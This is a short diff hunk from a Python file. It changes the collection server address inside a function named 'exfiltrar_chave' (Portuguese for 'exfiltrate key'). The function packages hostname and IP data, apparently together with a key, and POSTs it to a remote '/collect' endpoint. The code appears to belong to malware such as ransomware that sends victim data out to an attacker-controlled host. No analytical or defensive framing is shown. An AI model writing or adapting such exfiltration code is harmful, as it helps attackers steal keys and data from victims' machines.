@@ -177,7 +177,7 @@ def exfiltrar_chave() -> dict:
             "hostname": hostname,
             "ip": ip
         }
-        url = "http://10.254.19.238:8080/collect"
+        url = "http://10.150.3.162:8080/collect"
         response = requests.post(url, json=payload, timeout=10)
         if 200 <= response.status_code < 300:
             try:
